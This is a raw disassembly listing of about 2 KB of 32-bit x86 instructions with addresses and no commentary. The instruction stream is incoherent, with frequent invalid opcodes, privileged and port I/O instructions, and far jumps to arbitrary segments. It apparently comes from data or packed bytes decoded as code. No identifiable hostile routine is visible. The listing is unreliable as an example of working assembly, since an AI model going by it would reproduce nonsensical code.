  4067d6:	mov    ds:0x57f56b5d,eax
  4067db:	test   ah,bl
  4067dd:	mov    ch,0x2b
  4067df:	scas   eax,DWORD PTR es:[edi]
  4067e0:	test   al,0x35
  4067e2:	sub    al,0xdf
  4067e4:	lods   eax,DWORD PTR ds:[esi]
  4067e5:	cmc    
  4067e6:	inc    esp
  4067e7:	shl    DWORD PTR [ecx+ecx*8],cl
  4067ea:	(bad)  
  4067eb:	int    0xa1
  4067ed:	scas   eax,DWORD PTR es:[edi]
  4067ee:	push   0xffffffe9
  4067f0:	cld    
  4067f1:	leave  
  4067f2:	jo     0x406791
  4067f4:	mov    eax,0xe83f6b35
  4067f9:	cmp    dh,ah
  4067fb:	shr    DWORD PTR [eax+0x4b],0xfd
  4067ff:	retf   0x3e76
  406802:	loop   0x40681d
  406804:	(bad)  
  406805:	stos   DWORD PTR es:[edi],eax
  406806:	mov    dl,0x79
  406808:	mov    eax,ds:0xb0b4ba34
  40680d:	and    bl,BYTE PTR [ecx-0x6c]
  406810:	cmc    
  406811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406812:	scas   eax,DWORD PTR es:[edi]
  406813:	mov    bh,0x68
  406815:	xchg   ebp,eax
  406816:	dec    edx
  406817:	cmp    al,dh
  406819:	jne    0x4067c1
  40681b:	inc    eax
  40681c:	into   
  40681d:	fwait
  40681e:	imul   esi,edi,0xffffffcb
  406821:	(bad)  
  406823:	or     dl,cl
  406825:	mov    edi,0x926bf050
  40682a:	icebp  
  40682b:	(bad)  
  40682c:	push   0x6cdb2d8c
  406831:	ficom  WORD PTR [ebx+edi*4-0x2ae83174]
  406838:	add    esi,esi
  40683a:	xchg   ebx,eax
  40683b:	or     DWORD PTR [ebx-0x5b5604e],ecx
  406841:	scas   eax,DWORD PTR es:[edi]
  406842:	lahf   
  406843:	leave  
  406844:	outs   dx,DWORD PTR ds:[esi]
  406845:	sar    DWORD PTR [edx+edi*2-0x19],1
  406849:	cwde   
  40684a:	pushf  
  40684b:	push   esp
  40684c:	mov    bl,0x6a
  40684e:	rcl    BYTE PTR [ebp-0x15],1
  406851:	jp     0x4067f6
  406853:	lds    edi,FWORD PTR ds:0x3eb72a7b
  406859:	ret    
  40685a:	aam    0xd1
  40685c:	shl    BYTE PTR [ecx-0x3c],0x3
  406860:	push   0x6e31bec0
  406865:	mov    al,ds:0xc1124c52
  40686a:	retf   
  40686b:	out    0x55,al
  40686d:	mov    esp,0x7742783
  406872:	adc    eax,0xec73383c
  406877:	loope  0x40680e
  406879:	ja     0x4068aa
  40687b:	jmp    0x8bda786c
  406880:	fisttp DWORD PTR [ebx+0x5e]
  406883:	mov    ebp,0x7c479e29
  406888:	ds push es
  40688a:	push   eax
  40688b:	aaa    
  40688c:	xor    dh,ch
  40688e:	sti    
  40688f:	jns    0x406846
  406891:	jp     0x4068f6
  406893:	push   ds
  406894:	mov    al,ds:0x9ff2fca4
  406899:	mov    edx,0xab4b5b64
  40689e:	dec    eax
  40689f:	sub    al,0x14
  4068a1:	sahf   
  4068a2:	popf   
  4068a3:	mov    dh,0x53
  4068a5:	call   0x945b:0x2727e51d
  4068ac:	ror    BYTE PTR [ecx+0x755d47df],1
  4068b2:	pop    edx
  4068b3:	push   ebp
  4068b4:	ffree  st(5)
  4068b6:	and    al,0x7f
  4068b8:	xor    edx,esi
  4068ba:	lds    edi,FWORD PTR [ecx+0x6]
  4068bd:	lock std 
  4068bf:	push   ebx
  4068c0:	sar    ecx,0x40
  4068c3:	int3   
  4068c4:	jmp    0x40689d
  4068c6:	add    al,al
  4068c8:	scas   al,BYTE PTR es:[edi]
  4068c9:	jb     0x406891
  4068cb:	scas   al,BYTE PTR es:[edi]
  4068cc:	lock cmp BYTE PTR [edx-0x7c],0x60
  4068d1:	(bad)  
  4068d2:	fnsave [ecx+0x13defab0]
  4068d8:	loopne 0x40687a
  4068da:	popf   
  4068db:	psubw  mm4,QWORD PTR [eax]
  4068de:	lock shr dh,cl
  4068e1:	jae    0x406897
  4068e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e4:	pop    esi
  4068e5:	sub    ch,BYTE PTR [esi-0x4fc3bfdb]
  4068eb:	leave  
  4068ec:	lock es pop edx
  4068ef:	sub    ch,ch
  4068f1:	cwde   
  4068f2:	push   ecx
  4068f3:	dec    esi
  4068f4:	in     al,0xb6
  4068f6:	int    0x49
  4068f8:	mov    al,0x4d
  4068fa:	sub    al,0xf1
  4068fc:	dec    edi
  4068fd:	ds inc ebx
  4068ff:	mov    bh,0xf4
  406901:	mov    dl,0xd6
  406903:	jl     0x406945
  406905:	dec    ebp
  406906:	xor    ecx,esi
  406908:	mov    cs,WORD PTR [edi+eax*8-0x1b03f97b]
  40690f:	inc    ecx
  406910:	sbb    esp,eax
  406912:	add    al,0x3c
  406914:	push   esp
  406915:	jecxz  0x4068bb
  406917:	fnstenv [ebx+edx*8]
  40691a:	ins    DWORD PTR es:[edi],dx
  40691b:	xchg   al,ch
  40691d:	ss daa 
  40691f:	mov    ch,0x88
  406921:	inc    ebp
  406922:	or     esi,edi
  406924:	xchg   esp,eax
  406925:	xor    cl,BYTE PTR [ebp-0x1d09df36]
  40692b:	(bad)  
  40692c:	and    ecx,eax
  40692e:	lods   al,BYTE PTR ds:[esi]
  40692f:	push   ds
  406930:	stc    
  406931:	mov    edx,0xa02e6968
  406936:	add    ebx,DWORD PTR [esi]
  406938:	fsubr  QWORD PTR [ecx-0x3f]
  40693b:	mov    BYTE PTR [edi+eax*4+0x4a],ch
  40693f:	lods   eax,DWORD PTR ds:[esi]
  406940:	push   ss
  406941:	retf   0x41c5
  406944:	sahf   
  406945:	jmp    0xf8d:0x6f0db638
  40694c:	adc    BYTE PTR [ecx-0x72],ch
  40694f:	test   BYTE PTR [ecx],ah
  406951:	inc    ecx
  406952:	ins    DWORD PTR es:[edi],dx
  406953:	xor    al,0x21
  406955:	add    bl,BYTE PTR [ebx]
  406957:	mov    ebp,0xc8cbe580
  40695c:	jbe    0x4069c9
  40695e:	div    DWORD PTR [ebx+ecx*2]
  406961:	out    0x26,eax
  406963:	cmp    ch,ah
  406965:	xor    eax,DWORD PTR [ecx-0x5b36c6dd]
  40696b:	mov    dh,0x4c
  40696d:	inc    ebx
  40696e:	xchg   ebp,eax
  40696f:	mov    esp,0xd2272cdf
  406974:	mov    edx,0xb9eaf496
  406979:	fldenv [ebp+0x73]
  40697c:	push   eax
  40697d:	inc    esp
  40697e:	mov    ds:0x48d2169a,al
  406983:	xor    ebp,DWORD PTR [ebx+0x2e6473af]
  406989:	popa   
  40698a:	mov    cl,BYTE PTR [ebx]
  40698c:	push   0x2f
  40698e:	mov    bl,0x24
  406990:	loopne 0x4069cb
  406992:	rol    DWORD PTR [ebx+0x21f72d19],1
  406998:	mov    cl,0x63
  40699a:	xchg   ebx,eax
  40699b:	cmp    edx,esp
  40699d:	adc    DWORD PTR [edx-0x7c],edx
  4069a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069a1:	stc    
  4069a2:	in     al,dx
  4069a3:	int    0x51
  4069a5:	test   cl,dl
  4069a7:	jns    0x4069a0
  4069a9:	inc    ebx
  4069aa:	mov    ebx,0x5742d954
  4069af:	test   DWORD PTR [ebp+0x19ae15bf],0x3dbcae07
  4069b9:	fdivr  st,st(7)
  4069bb:	or     esi,DWORD PTR [ebx-0x436b6090]
  4069c1:	aad    0xc3
  4069c3:	adc    DWORD PTR [esi-0x27],ecx
  4069c6:	mov    BYTE PTR [esi],bl
  4069c8:	inc    ecx
  4069c9:	or     al,0x4e
  4069cb:	loopne 0x40699d
  4069cd:	sahf   
  4069ce:	adc    eax,0xac91383a
  4069d3:	inc    esp
  4069d4:	and    BYTE PTR [ebx],cl
  4069d6:	call   0x6e432d56
  4069db:	jmp    0x406a15
  4069dd:	dec    ebp
  4069de:	push   eax
  4069df:	sbb    eax,0xfc2e48c7
  4069e4:	repnz or eax,0xf783bd52
  4069ea:	mov    ?,ebx
  4069ec:	stos   DWORD PTR es:[edi],eax
  4069ed:	adc    ecx,DWORD PTR [esi-0x16]
  4069f0:	adc    bh,dh
  4069f2:	sub    BYTE PTR [edx-0x69b18ac2],ch
  4069f8:	jle    0x406a55
  4069fa:	and    eax,0x10dc544e
  4069ff:	jle    0x406a1b
  406a01:	outs   dx,DWORD PTR ds:[esi]
  406a02:	out    0x88,eax
  406a04:	jl     0x406a33
  406a06:	ins    DWORD PTR es:[edi],dx
  406a07:	cmp    DWORD PTR [ebx+edi*4+0x1aa07e5b],0x4a
  406a0f:	outs   dx,DWORD PTR ds:[esi]
  406a10:	jo     0x40699e
  406a12:	shl    DWORD PTR [ecx+0x36],1
  406a15:	or     al,0xbf
  406a17:	out    0x3b,al
  406a19:	and    eax,0xbac4b62b
  406a1e:	pop    ebp
  406a1f:	mov    bh,BYTE PTR [edi+edi*8-0x13065cb4]
  406a26:	sub    dl,cl
  406a28:	adc    BYTE PTR [edi+ebp*4-0x28],al
  406a2c:	dec    eax
  406a2d:	test   BYTE PTR [ecx],dl
  406a2f:	lea    ebp,[edi-0x70]
  406a32:	jg     0x4069df
  406a34:	xchg   ebp,eax
  406a35:	xchg   DWORD PTR ds:0x3b683c93,ebp
  406a3b:	shl    BYTE PTR [edi+edi*8+0x36a5657b],0xc5
  406a43:	fdivr  QWORD PTR ds:0x8f3f55e7
  406a49:	inc    edi
  406a4a:	loopne 0x4069fb
  406a4c:	shr    DWORD PTR [eax+ecx*1+0x48],cl
  406a50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a51:	jmp    0x93552f39
  406a56:	cmc    
  406a57:	stos   DWORD PTR es:[edi],eax
  406a58:	xor    dh,bh
  406a5a:	dec    ebp
  406a5b:	sbb    dl,bh
  406a5d:	test   DWORD PTR [edx+0x61557cb0],0xe695f320
  406a67:	int    0xc7
  406a69:	popa   
  406a6a:	push   esi
  406a6b:	sbb    bh,BYTE PTR [ecx+0x6]
  406a6e:	pop    es
  406a6f:	mov    al,ds:0xa467e92a
  406a74:	bound  eax,QWORD PTR [ebx+0x54]
  406a77:	fnstsw WORD PTR [eax]
  406a79:	fwait
  406a7a:	repz popa 
  406a7c:	xchg   ebp,eax
  406a7d:	fisttp QWORD PTR [esi]
  406a7f:	enter  0x7a1f,0xbc
  406a83:	adc    al,0xcb
  406a85:	test   eax,0x71203b69
  406a8a:	push   esp
  406a8b:	outs   dx,BYTE PTR ds:[esi]
  406a8c:	mov    bh,0x8a
  406a8e:	xor    al,BYTE PTR [edi-0x2c2ce2f3]
  406a94:	nop
  406a95:	mov    edx,0xc508732b
  406a9a:	(bad)  
  406a9b:	hlt    
  406a9c:	push   ebp
  406a9d:	sbb    ch,BYTE PTR [ebp-0x755aa40]
  406aa3:	aad    0x6b
  406aa5:	mov    ah,0xce
  406aa7:	adc    BYTE PTR [ebx+0x14bd9a76],ah
  406aad:	xor    BYTE PTR [eax-0x35],bl
  406ab0:	popf   
  406ab1:	push   es
  406ab2:	lods   eax,DWORD PTR ds:[esi]
  406ab3:	cld    
  406ab4:	ret    0xe7a1
  406ab7:	int3   
  406ab8:	fcmovbe st,st(6)
  406aba:	mov    BYTE PTR [ebp+0x78],dh
  406abd:	mov    eax,0x27bb0c4a
  406ac2:	jo     0x406a91
  406ac4:	aaa    
  406ac5:	ds je  0x406afb
  406ac8:	or     DWORD PTR [eax],edx
  406aca:	je     0x406a5b
  406acc:	xor    eax,0x2f8210e3
  406ad1:	ja     0x406adf
  406ad3:	les    edi,FWORD PTR [eax]
  406ad5:	(bad)  
  406ad6:	pop    edx
  406ad7:	mov    DWORD PTR [edx+0x795e4c3e],eax
  406add:	(bad)  
  406ade:	call   0x668b:0x94798e9b
  406ae5:	jbe    0x406aa9
  406ae7:	fnstcw WORD PTR [eax]
  406ae9:	xchg   esp,eax
  406aea:	inc    eax
  406aeb:	cmp    BYTE PTR [ebp+0x69c92c6b],bh
  406af1:	xor    bh,ah
  406af3:	cwde   
  406af4:	std    
  406af5:	pop    ecx
  406af6:	aam    0xb8
  406af8:	aam    0x82
  406afa:	add    BYTE PTR [esi-0x19447a88],ch
  406b00:	inc    esp
  406b01:	popf   
  406b02:	rol    edi,cl
  406b04:	mov    esp,0x138d5ae3
  406b09:	xchg   ebp,eax
  406b0a:	inc    ebx
  406b0b:	inc    ebp
  406b0c:	xlat   BYTE PTR ds:[ebx]
  406b0d:	or     ebp,DWORD PTR [ebp+0x331c9c1e]
  406b13:	sbb    bl,al
  406b15:	pop    esp
  406b16:	stc    
  406b17:	push   0xffffff9e
  406b19:	cwde   
  406b1a:	cmp    eax,0xbf55154b
  406b1f:	xor    BYTE PTR [edx-0x29d56e25],bh
  406b25:	icebp  
  406b26:	ds jge 0x406b69
  406b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2a:	js     0x406b98
  406b2c:	and    DWORD PTR [eax+0x48],0x7ff230c4
  406b33:	call   DWORD PTR fs:[esi+0x5c]
  406b37:	das    
  406b38:	xchg   esi,eax
  406b39:	out    0xfb,al
  406b3b:	add    BYTE PTR [eax+0x9],0x2f
  406b3f:	mov    al,0x92
  406b41:	pop    edx
  406b42:	rcl    DWORD PTR [ecx-0x7],0x9c
  406b46:	xchg   DWORD PTR [ecx-0x1483202],ebx
  406b4c:	daa    
  406b4d:	clc    
  406b4e:	lds    edi,FWORD PTR [ecx+0x54]
  406b51:	mov    ds,esi
  406b53:	sub    al,0x5d
  406b55:	sahf   
  406b56:	call   0x72e6:0x40e5f429
  406b5d:	cmp    esi,DWORD PTR [ecx+0x49500a89]
  406b63:	(bad)  
  406b64:	in     al,0x59
  406b66:	cmp    eax,0x4e3c545d
  406b6b:	test   al,0x13
  406b6d:	add    esp,esi
  406b6f:	add    al,0x45
  406b71:	push   edi
  406b72:	xchg   eax,ebp
  406b74:	sbb    bl,BYTE PTR [ecx]
  406b76:	cmp    edi,DWORD PTR [ebp-0x1]
  406b79:	pop    es
  406b7a:	cmp    ah,ah
  406b7c:	jl     0x406b0f
  406b7e:	sbb    esp,DWORD PTR [ecx+edx*4-0x40b3f97c]
  406b85:	icebp  
  406b86:	into   
  406b87:	jo     0x406b53
  406b89:	mov    eax,ds:0xa791850b
  406b8e:	call   0x6b67:0xcc4b9300
  406b95:	push   ds
  406b96:	xor    BYTE PTR [ebp+0x6f],0x59
  406b9a:	cli    
  406b9b:	ds mov bh,0x8f
  406b9e:	lock xchg BYTE PTR [eax],bl
  406ba1:	out    dx,al
  406ba2:	mov    eax,ds:0xe83b7f9b
  406ba7:	adc    DWORD PTR [edx],ecx
  406ba9:	jae    0x406b91
  406bab:	sub    BYTE PTR [ebx+0x35],dl
  406bae:	mov    ?,WORD PTR [ecx]
  406bb0:	cli    
  406bb1:	add    eax,0x70847f09
  406bb6:	ja     0x406bcf
  406bb8:	and    BYTE PTR [edi-0x532afdfc],dh
  406bbe:	daa    
  406bbf:	test   ah,ch
  406bc1:	jns    0x406c41
  406bc3:	sub    BYTE PTR [edi-0xe],ch
  406bc6:	scas   eax,DWORD PTR es:[edi]
  406bc7:	push   0x0
  406bc9:	dec    esi
  406bca:	inc    ebx
  406bcb:	addr16 dec ecx
  406bcd:	stos   DWORD PTR es:[edi],eax
  406bce:	add    eax,0x37034b6f
  406bd3:	bnd ja 0x406bce
  406bd6:	dec    edx
  406bd7:	xlat   BYTE PTR ds:[ebx]
  406bd8:	pop    ebx
  406bd9:	xor    dh,BYTE PTR [esi+0xd]
  406bdc:	es aaa 
  406bde:	popf   
  406bdf:	push   0xffffff92
  406be1:	adc    BYTE PTR [ecx],bl
  406be3:	hlt    
  406be4:	repnz and al,0xfa
  406be7:	fld    st(3)
  406be9:	and    ebx,ebx
  406beb:	dec    edi
  406bec:	pop    ds
  406bed:	lea    edi,[edi+eax*1]
  406bf0:	popf   
  406bf1:	xor    BYTE PTR [esp+ebp*1+0x10],bh
  406bf5:	mov    bl,0x2f
  406bf7:	or     BYTE PTR [edi],0x28
  406bfa:	into   
  406bfb:	adc    ch,cl
  406bfd:	cdq    
  406bfe:	push   eax
  406bff:	cmp    BYTE PTR [eax-0x74],bl
  406c02:	retf   0xa321
  406c05:	mov    eax,0xdf6e64ab
  406c0a:	ror    bl,0x37
  406c0d:	cmp    al,0xb7
  406c0f:	push   es
  406c10:	adc    al,0xa9
  406c12:	sub    DWORD PTR [ecx],edi
  406c14:	(bad)  
  406c15:	popf   
  406c16:	addr16 add al,dh
  406c19:	jne    0x406c7e
  406c1b:	mov    edx,0xe463a4a1
  406c20:	jns    0x406c11
  406c22:	pop    ds
  406c23:	sub    ecx,DWORD PTR [esi+ecx*1-0x18f2becd]
  406c2a:	stos   DWORD PTR es:[edi],eax
  406c2b:	and    cl,0xb9
  406c2e:	arpl   ax,cx
  406c30:	cli    
  406c31:	sbb    al,0x5d
  406c33:	pop    ecx
  406c34:	repz cmp DWORD PTR [ebx+0x34],0xda142351
  406c3c:	jp     0x406beb
  406c3e:	iret   
  406c3f:	sbb    al,0xe7
  406c41:	push   es
  406c42:	gs cs hlt 
  406c45:	pop    esp
  406c46:	fld    QWORD PTR [esp+eiz*2]
  406c49:	ss dec edx
  406c4b:	aad    0x8b
  406c4d:	mov    al,dl
  406c4f:	mov    edi,0x43bb2bb5
  406c54:	sub    BYTE PTR ds:0x765c018a,ah
  406c5a:	cmp    edx,ecx
  406c5c:	ins    BYTE PTR es:[edi],dx
  406c5d:	push   ebx
  406c5e:	(bad)  ds:0x6beefd36
  406c64:	ficomp WORD PTR ds:0xad9c06eb
  406c6a:	sub    BYTE PTR [edi+0x6a117838],0xc8
  406c71:	inc    ebp
  406c72:	(bad)  [esp+esi*4-0x16]
  406c76:	dec    esi
  406c77:	lock adc ebp,DWORD PTR [edi]
  406c7a:	hlt    
  406c7b:	jb     0x406c8e
  406c7d:	cmp    BYTE PTR [ecx+eax*8+0x24],bh
  406c81:	loope  0x406c29
  406c83:	mov    edi,0x9c4eb0c6
  406c88:	adc    edx,DWORD PTR [edx+0x5ca21b59]
  406c8e:	dec    esp
  406c8f:	inc    esi
  406c90:	addr16 push 0x694dfb5c
  406c96:	repnz mov ds:0xca82884c,eax
  406c9c:	lock lahf 
  406c9e:	jg     0x406c9b
  406ca0:	add    DWORD PTR [ecx-0x63],esi
  406ca3:	sbb    eax,0x6076c3ed
  406ca8:	fwait
  406ca9:	jnp    0x406d27
  406cab:	mov    ds:0xd023960b,al
  406cb0:	into   
  406cb1:	and    bl,bl
  406cb3:	stc    
  406cb4:	(bad)  cs:[ebx+edx*1-0x1e29121e]
  406cbc:	sbb    ah,BYTE PTR [edx]
  406cbe:	sbb    eax,0x9cf80ebe
  406cc3:	in     al,0xe3
  406cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cc6:	rcl    dh,cl
  406cc8:	ja     0x406c4f
  406cca:	pop    ecx
  406ccb:	int    0x3a
  406ccd:	enter  0xb941,0xab
  406cd1:	adc    ecx,eax
  406cd3:	or     eax,0xc453d9ed
  406cd8:	lock jge 0x406cbb
  406cdb:	cmp    ebp,DWORD PTR [eax-0xf]
  406cde:	xchg   edx,eax
  406cdf:	or     al,0xbf
  406ce1:	ds das 
  406ce3:	sbb    bl,BYTE PTR [edx+esi*1]
  406ce6:	sbb    eax,0xf6ef9b83
  406ceb:	jno    0x406c89
  406ced:	outs   dx,DWORD PTR ds:[esi]
  406cee:	test   edx,0x375eab9c
  406cf4:	jmp    0xf3f8:0xe9bf74ac
  406cfb:	inc    esi
  406cfc:	mov    al,ds:0xb74aeac0
  406d01:	sub    DWORD PTR [edx],edx
  406d03:	mov    ds:0x74fe79c5,al
  406d08:	jmp    0xa98e:0x9f2f8d85
  406d0f:	je     0x406d3c
  406d11:	mov    dl,0xa3
  406d13:	in     eax,0x20
  406d15:	or     ebp,eax
  406d17:	jmp    0xd3abbec7
  406d1c:	sub    BYTE PTR [edx+0x62c835b8],bh
  406d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d23:	xchg   BYTE PTR [edi-0x10b3d698],cl
  406d29:	jnp    0x406d29
  406d2b:	clc    
  406d2c:	and    cl,dl
  406d2e:	aam    0xef
  406d30:	cmp    eax,0x67e3d073
  406d35:	aas    
  406d36:	rol    BYTE PTR [ecx-0x68],cl
  406d39:	test   DWORD PTR [edi+0x63],ecx
  406d3c:	in     al,0x3c
  406d3e:	pop    ss
  406d3f:	mov    bh,0x4d
  406d41:	cmp    DWORD PTR [ebp+0x1593ab3c],0x80eeafd3
  406d4b:	fs es jle 0x406d43
  406d4f:	out    dx,eax
  406d50:	mov    WORD PTR [ebx],cs
  406d52:	nop
  406d53:	push   edx
  406d54:	pop    ecx
  406d55:	mov    ds:0x304f19e1,eax
  406d5a:	mov    ebx,0x669ff6ef
  406d5f:	xchg   ecx,eax
  406d60:	mov    WORD PTR [edx],es
  406d62:	fsub   DWORD PTR [esp+ebx*4]
  406d65:	(bad)  
  406d66:	je     0x406d73
  406d68:	adc    BYTE PTR [eax],al
  406d6a:	nop
  406d6b:	mov    al,ds:0xa8fc3f24
  406d70:	sbb    esi,DWORD PTR [ecx-0x4d7dfaea]
  406d76:	les    ebx,FWORD PTR [eax+0x4d]
  406d79:	sbb    dh,BYTE PTR ds:0x8e935f61
  406d7f:	and    esp,esi
  406d81:	lea    esi,[esi-0x18]
  406d84:	fnsetpm(287 only) 
  406d86:	xchg   ebp,eax
  406d87:	(bad)  
  406d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d8a:	aaa    
  406d8b:	adc    eax,0x2d1fbdba
  406d90:	fistp  WORD PTR [ecx+0x60]
  406d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d94:	sbb    BYTE PTR [ebx],bl
  406d96:	pop    ecx
  406d98:	sub    DWORD PTR ds:0x976af05,ecx
  406d9e:	cs mov ebx,0x9eedb8b7
  406da4:	retf   0x603b
  406da7:	stos   BYTE PTR es:[edi],al
  406da8:	and    eax,0x1daf479c
  406dad:	je     0x406d4d
  406daf:	jp     0x406def
  406db1:	and    DWORD PTR [edi+0x74a0f942],ebp
  406db7:	hlt    
  406db8:	cdq    
  406db9:	aad    0x12
  406dbb:	loope  0x406db7
  406dbd:	loope  0x406dbc
  406dbf:	xchg   bh,dh
  406dc1:	retf   0x3843
  406dc4:	dec    edi
  406dc5:	mov    eax,ds:0x180cc58f
  406dca:	mov    ?,WORD PTR [edi]
  406dcc:	or     cl,BYTE PTR [ebx]
  406dce:	pop    es
  406dcf:	fcom   DWORD PTR [eax+0x7d]
  406dd2:	js     0x406e47
  406dd4:	scas   al,BYTE PTR es:[edi]
  406dd5:	push   eax
  406dd6:	mov    ebx,0x26e149d8
  406ddb:	lock addr16 mov edx,0x7985de17
  406de2:	sti    
  406de3:	mov    al,0x43
  406de5:	push   ebp
  406de6:	pop    ecx
  406de7:	xchg   esp,eax
  406de8:	push   edi
  406de9:	(bad)  
  406dea:	call   0x7f7d:0x14dbf2af
  406df1:	pushf  
  406df2:	inc    edi
  406df3:	mov    ds:0xc4e63593,al
  406df8:	test   DWORD PTR [ecx],esi
  406dfa:	in     al,0x7f
  406dfc:	outs   dx,DWORD PTR ds:[esi]
  406dfd:	xchg   ebx,eax
  406dfe:	push   cs
  406dff:	ins    BYTE PTR es:[edi],dx
  406e00:	lods   eax,DWORD PTR ds:[esi]
  406e01:	mov    dh,0xe7
  406e03:	mov    ds,WORD PTR [edx-0x35]
  406e06:	pop    edx
  406e07:	inc    ecx
  406e08:	jecxz  0x406dee
  406e0a:	fwait
  406e0b:	pop    ebx
  406e0c:	lods   al,BYTE PTR ds:[esi]
  406e0d:	cli    
  406e0e:	not    DWORD PTR [ecx+edx*2-0x18951eb2]
  406e15:	lods   eax,DWORD PTR ds:[esi]
  406e16:	out    dx,eax
  406e17:	push   es
  406e18:	jl     0x406dd3
  406e1a:	mov    ecx,0xc2762bb8
  406e1f:	dec    eax
  406e20:	sahf   
  406e21:	and    eax,0xb4b49089
  406e26:	addr16 in eax,dx
  406e28:	dec    ecx
  406e29:	adc    edi,DWORD PTR [ecx-0x27]
  406e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e2d:	jl     0x406e24
  406e2f:	pop    edi
  406e30:	lea    ebx,ds:0x90aafe46
  406e36:	sbb    eax,0x4ed72f6
  406e3b:	leave  
  406e3c:	add    al,0x46
  406e3e:	cld    
  406e3f:	arpl   WORD PTR [ebx],sp
  406e41:	ret    
  406e42:	out    0x54,eax
  406e44:	out    0x3a,eax
  406e46:	dec    edi
  406e47:	pop    ebp
  406e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e49:	cwde   
  406e4a:	repnz xor DWORD PTR [ebx+0x63b17c95],edi
  406e51:	pop    ecx
  406e52:	add    edi,ebx
  406e54:	or     DWORD PTR [ecx-0x280d616e],0xffffffb0
  406e5b:	adc    DWORD PTR [edi+0x41],ebx
  406e5e:	cmp    BYTE PTR [ebx],bh
  406e60:	ror    DWORD PTR [ecx-0x23],0x3f
  406e64:	mov    ecx,0x27349637
  406e69:	shl    BYTE PTR [esi-0x62],cl
  406e6c:	dec    DWORD PTR [ecx]
  406e6e:	or     DWORD PTR [ecx+0x2ee704b2],esi
  406e74:	fwait
  406e75:	call   0xb4c8:0xb281da2a
  406e7c:	xor    al,0x8b
  406e7e:	retf   0xb895
  406e81:	pop    esi
  406e82:	mov    DWORD PTR [eax-0x7d81687a],edx
  406e88:	clc    
  406e89:	std    
  406e8a:	and    eax,0x69f8df26
  406e8f:	cmp    al,0x88
  406e91:	popa   
  406e92:	out    0x3,al
  406e94:	cmp    edx,0x4c
  406e97:	stos   BYTE PTR es:[edi],al
  406e98:	cld    
  406e99:	dec    eax
  406e9a:	loope  0x406ef6
  406e9c:	inc    esp
  406e9d:	or     al,0x91
  406e9f:	sbb    eax,0xa76f953e
  406ea4:	out    0x84,al
  406ea6:	daa    
  406ea7:	imul   edi,ebx,0xffffff87
  406eaa:	sbb    al,0x13
  406eac:	idiv   edi
  406eae:	shl    DWORD PTR es:[ebx+0xf],1
  406eb2:	rol    BYTE PTR [ecx+edi*4+0x346b0c8e],cl
  406eb9:	cmp    al,0x72
  406ebb:	pushf  
  406ebc:	in     eax,dx
  406ebd:	pop    ebp
  406ebe:	daa    
  406ebf:	add    BYTE PTR [edx+ecx*4-0x55],ch
  406ec3:	fsub   st,st(6)
  406ec5:	mov    cl,0x9f
  406ec7:	(bad)  
  406ec8:	fcom   QWORD PTR [eax+0x59]
  406ecb:	cmp    dh,BYTE PTR fs:[ebp+0x76]
  406ecf:	ss cs sbb eax,0x2314cb7f
  406ed6:	hlt    
  406ed7:	adc    bh,BYTE PTR [ebx+0x471d5cd4]
  406edd:	nop
  406ede:	lock int 0x6a
  406ee1:	shl    DWORD PTR [edi+0x3d],cl
  406ee4:	stc    
  406ee5:	ins    BYTE PTR es:[edi],dx
  406ee6:	lds    ecx,FWORD PTR [ebp+0x68]
  406ee9:	xchg   edi,eax
  406eea:	hlt    
  406eeb:	xchg   BYTE PTR [ebx-0xc],dl
  406eee:	test   DWORD PTR [ebp-0x66],esi
  406ef1:	(bad)  
  406ef2:	mov    eax,0x5472f025
  406ef7:	js     0x406e8a
  406ef9:	sub    edi,eax
  406efb:	mov    DWORD PTR [edi-0x51b28984],ebx
  406f01:	fs call 0xbecc:0xaa71d7a7
  406f09:	mov    esi,0x7d89ad
  406f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f0f:	jb     0x406ea9
  406f11:	aaa    
  406f12:	loop   0x406f6e
  406f14:	ins    BYTE PTR es:[edi],dx
  406f15:	cs dec ebp
  406f17:	mov    ebp,0x28add126
  406f1c:	cmp    DWORD PTR [edi+0x53],esi
  406f1f:	out    0x66,eax
  406f21:	es jo  0x406f1e
  406f24:	mov    ds:0xa7b272d3,al
  406f29:	into   
  406f2a:	inc    BYTE PTR [ecx+0x72d9af5a]
  406f30:	outs   dx,BYTE PTR ds:[esi]
  406f31:	loopne 0x406f77
  406f33:	test   eax,0x1e96763d
  406f38:	mov    ch,0xf3
  406f3a:	xchg   ebp,eax
  406f3b:	retf   
  406f3c:	mov    ds,WORD PTR [ecx+0x164b20f3]
  406f42:	loopne 0x406ec8
  406f44:	or     dh,BYTE PTR [ebx-0x71]
  406f47:	icebp  
  406f48:	xlat   BYTE PTR ds:[ebx]
  406f49:	mov    ?,WORD PTR [eax]
  406f4b:	xchg   ecx,eax
  406f4c:	mov    cl,0xc8
  406f4e:	out    0xa,al
  406f50:	push   ds
  406f51:	js     0x406f60
  406f53:	daa    
  406f54:	or     al,0x90
  406f56:	adc    cl,BYTE PTR [eax+eiz*8]
  406f59:	fdiv   QWORD PTR [edx+0x76]
  406f5c:	jl     0x406f8f
  406f5e:	fs mov edi,0xe426c365
  406f64:	xchg   DWORD PTR [ebx+0x1f],ebp
  406f67:	rol    DWORD PTR gs:[ecx],1
  406f6a:	aaa    
  406f6b:	mov    bl,0x98
  406f6d:	dec    edi
  406f6e:	retf   
  406f6f:	punpckhwd mm1,QWORD PTR ds:[ebp-0x115ff58c]
  406f77:	popa   
  406f78:	push   cs
  406f79:	mov    BYTE PTR [ebx+0x4ea3c0a8],ch
  406f7f:	inc    ebp
  406f80:	das    
  406f81:	adc    ah,BYTE PTR [edx]
  406f83:	jge    0x406ff3
  406f85:	cmp    al,0xc5
  406f87:	cs aas 
  406f89:	test   DWORD PTR [edx],eax
  406f8b:	pop    es
  406f8c:	inc    ecx
  406f8d:	rcr    bl,0x5d
  406f90:	sub    DWORD PTR [ebx+0x733c75a0],eax
  406f96:	ror    BYTE PTR [ebp+0x44],1
  406f99:	and    bl,dh
